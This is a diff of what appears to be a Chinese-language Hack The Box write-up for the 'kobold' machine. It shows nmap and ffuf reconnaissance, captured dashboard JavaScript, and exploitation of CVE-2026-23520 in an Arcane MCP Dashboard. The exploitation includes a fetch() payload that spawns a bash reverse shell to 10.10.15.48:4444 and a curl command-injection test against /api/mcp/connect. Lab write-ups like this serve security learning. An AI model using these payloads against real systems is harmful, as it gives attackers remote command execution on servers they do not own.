@@ -42,95 +42,7 @@ Host is up (0.26s latency).
 
 PORT     STATE SERVICE   VERSION
 3552/tcp open  taserver?
-| fingerprint-strings:
-|   GenericLines:
-|     HTTP/1.1 400 Bad Request
-|     Content-Type: text/plain; charset=utf-8
-|     Connection: close
-|     Request
-|   GetRequest:
-|     HTTP/1.0 200 OK
-|     Accept-Ranges: bytes
-|     Cache-Control: no-cache, no-store, must-revalidate
-|     Content-Length: 2081
-|     Content-Type: text/html; charset=utf-8
-|     Expires: 0
-|     Pragma: no-cache
-|     Date: Mon, 23 Mar 2026 17:26:48 GMT
-|     <!doctype html>
-|     <html lang="%lang%">
-|     <head>
-|     <meta charset="utf-8" />
-|     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
-|     <meta http-equiv="Pragma" content="no-cache" />
-|     <meta http-equiv="Expires" content="0" />
-|     <link rel="icon" href="/api/app-images/favicon" />
-|     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover" />
-|     <link rel="manifest" href="/app.webmanifest" />
-|     <meta name="theme-color" content="oklch(1 0 0)" media="(prefers-color-scheme: light)" />
-|     <meta name="theme-color" content="oklch(0.141 0.005 285.823)" media="(prefers-color-scheme: dark)" />
-|     <link rel="modu
-|   HTTPOptions:
-|     HTTP/1.0 200 OK
-|     Accept-Ranges: bytes
-|     Cache-Control: no-cache, no-store, must-revalidate
-|     Content-Length: 2081
-|     Content-Type: text/html; charset=utf-8
-|     Expires: 0
-|     Pragma: no-cache
-|     Date: Mon, 23 Mar 2026 17:26:49 GMT
-|     <!doctype html>
-|     <html lang="%lang%">
-|     <head>
-|     <meta charset="utf-8" />
-|     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
-|     <meta http-equiv="Pragma" content="no-cache" />
-|     <meta http-equiv="Expires" content="0" />
-|     <link rel="icon" href="/api/app-images/favicon" />
-|     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover" />
-|     <link rel="manifest" href="/app.webmanifest" />
-|     <meta name="theme-color" content="oklch(1 0 0)" media="(prefers-color-scheme: light)" />
-|     <meta name="theme-color" content="oklch(0.141 0.005 285.823)" media="(prefers-color-scheme: dark)" />
-|_    <link rel="modu
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port3552-TCP:V=7.80%I=7%D=3/24%Time=69C177D7%P=x86_64-pc-linux-gnu%r(Ge
-SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
-SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
-SF:20Request")%r(GetRequest,8FF,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\
-SF:x20bytes\r\nCache-Control:\x20no-cache,\x20no-store,\x20must-revalidate
-SF:\r\nContent-Length:\x202081\r\nContent-Type:\x20text/html;\x20charset=u
-SF:tf-8\r\nExpires:\x200\r\nPragma:\x20no-cache\r\nDate:\x20Mon,\x2023\x20
-SF:Mar\x202026\x2017:26:48\x20GMT\r\n\r\n<!doctype\x20html>\n<html\x20lang
-SF:=\"%lang%\">\n\t<head>\n\t\t<meta\x20charset=\"utf-8\"\x20/>\n\t\t<meta
-SF:\x20http-equiv=\"Cache-Control\"\x20content=\"no-cache,\x20no-store,\x2
-SF:0must-revalidate\"\x20/>\n\t\t<meta\x20http-equiv=\"Pragma\"\x20content
-SF:=\"no-cache\"\x20/>\n\t\t<meta\x20http-equiv=\"Expires\"\x20content=\"0
-SF:\"\x20/>\n\t\t<link\x20rel=\"icon\"\x20href=\"/api/app-images/favicon\"
-SF:\x20/>\n\t\t<meta\x20name=\"viewport\"\x20content=\"width=device-width,
-SF:\x20initial-scale=1,\x20maximum-scale=1,\x20viewport-fit=cover\"\x20/>\
-SF:n\t\t<link\x20rel=\"manifest\"\x20href=\"/app\.webmanifest\"\x20/>\n\t\
-SF:t<meta\x20name=\"theme-color\"\x20content=\"oklch\(1\x200\x200\)\"\x20m
-SF:edia=\"\(prefers-color-scheme:\x20light\)\"\x20/>\n\t\t<meta\x20name=\"
-SF:theme-color\"\x20content=\"oklch\(0\.141\x200\.005\x20285\.823\)\"\x20m
-SF:edia=\"\(prefers-color-scheme:\x20dark\)\"\x20/>\n\t\t\n\t\t<link\x20re
-SF:l=\"modu")%r(HTTPOptions,8FF,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\
-SF:x20bytes\r\nCache-Control:\x20no-cache,\x20no-store,\x20must-revalidate
-SF:\r\nContent-Length:\x202081\r\nContent-Type:\x20text/html;\x20charset=u
-SF:tf-8\r\nExpires:\x200\r\nPragma:\x20no-cache\r\nDate:\x20Mon,\x2023\x20
-SF:Mar\x202026\x2017:26:49\x20GMT\r\n\r\n<!doctype\x20html>\n<html\x20lang
-SF:=\"%lang%\">\n\t<head>\n\t\t<meta\x20charset=\"utf-8\"\x20/>\n\t\t<meta
-SF:\x20http-equiv=\"Cache-Control\"\x20content=\"no-cache,\x20no-store,\x2
-SF:0must-revalidate\"\x20/>\n\t\t<meta\x20http-equiv=\"Pragma\"\x20content
-SF:=\"no-cache\"\x20/>\n\t\t<meta\x20http-equiv=\"Expires\"\x20content=\"0
-SF:\"\x20/>\n\t\t<link\x20rel=\"icon\"\x20href=\"/api/app-images/favicon\"
-SF:\x20/>\n\t\t<meta\x20name=\"viewport\"\x20content=\"width=device-width,
-SF:\x20initial-scale=1,\x20maximum-scale=1,\x20viewport-fit=cover\"\x20/>\
-SF:n\t\t<link\x20rel=\"manifest\"\x20href=\"/app\.webmanifest\"\x20/>\n\t\
-SF:t<meta\x20name=\"theme-color\"\x20content=\"oklch\(1\x200\x200\)\"\x20m
-SF:edia=\"\(prefers-color-scheme:\x20light\)\"\x20/>\n\t\t<meta\x20name=\"
-SF:theme-color\"\x20content=\"oklch\(0\.141\x200\.005\x20285\.823\)\"\x20m
-SF:edia=\"\(prefers-color-scheme:\x20dark\)\"\x20/>\n\t\t\n\t\t<link\x20re
-SF:l=\"modu");
+...
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 102.23 seconds
@@ -158,28 +70,7 @@ Nmap done: 1 IP address (1 host up) scanned in 0.93 seconds
 ### Subdomain Scanning
 ```bash
 $ ffuf -u https://kobold.htb -H "Host: FUZZ.kobold.htb" -w /snap/seclists/1214/Discovery/DNS/subdomains-top1million-20000.txt -k -fs 154
-
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
-
-       v1.1.0
-________________________________________________
-
- :: Method           : GET
- :: URL              : https://kobold.htb
- :: Wordlist         : FUZZ: /snap/seclists/1214/Discovery/DNS/subdomains-top1million-20000.txt
- :: Header           : Host: FUZZ.kobold.htb
- :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 40
- :: Matcher          : Response status: 200,204,301,302,307,401,403
- :: Filter           : Response size: 154
-________________________________________________
+...
 
 mcp                     [Status: 200, Size: 466, Words: 57, Lines: 15]
 bin                     [Status: 200, Size: 24392, Words: 1218, Lines: 386]
@@ -194,7 +85,75 @@ mcp.kobold.htb
 然後在網路上看到Arcane MCP Dashboard的CVE([CVE-2026-23520 Detail](https://nvd.nist.gov/vuln/detail/CVE-2026-23520))
 ```javascript
 fetch("/api/mcp/connect", {method: "POST", headers:{"Content-Type":"application/json"},body: JSON.stringify({serverId:"pwn",serverConfig:{command:"bash",args:["-c","bash -i >& /dev/tcp/10.10.15.48/4444 0>&1"],env:{}}})})
+```
 
+在往來的封包中有看到api如下
+```javascript
+async function xnt(e) {
+    const t = await fetch("/api/mcp/export/server", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            serverId: e
+        })
+    });
+    if (!t.ok) {
+        let n = `Export failed (${t.status})`;
+        try {
+            const r = await t.json();
+            r?.error && (n = r.error)
+        } catch {}
+        throw new Error(n)
+    }
+    return t.json()
+}
+async function cb(e, t) {
+    const n = await fetch("/api/mcp/tools/list", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            serverId: e,
+            modelId: t
+        })
+    });
+    let r = null;
+    try {
+        r = await n.json()
+    } catch {}
+    if (!n.ok) {
+        const a = r?.error || `List tools failed (${n.status})`;
+        throw new Error(a)
+    }
+    return r
+}
+async function f_(e, t, n, r) {
+    const a = await fetch("/api/mcp/tools/execute", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            serverId: e,
+            toolName: t,
+            parameters: n,
+            taskOptions: r
+        })
+    });
+    let i = null;
+    try {
+        i = await a.json()
+    } catch {}
+    return a.ok ? i : {
+        error: i?.error || `Execute tool failed (${a.status})`
+    }
+}
+async function _ht() {
+    return (await fetch("/api/mcp/servers")).json()
+}
 ```
 ```bash
 curl -k https://mcp.kobold.htb/api/mcp/connect -H "Content-Type: application/json" -d '{"serverId":"pwn", "serverConfig":{"command":"bash", "args": ["-c", "sleep 5"],"env": {}}}'
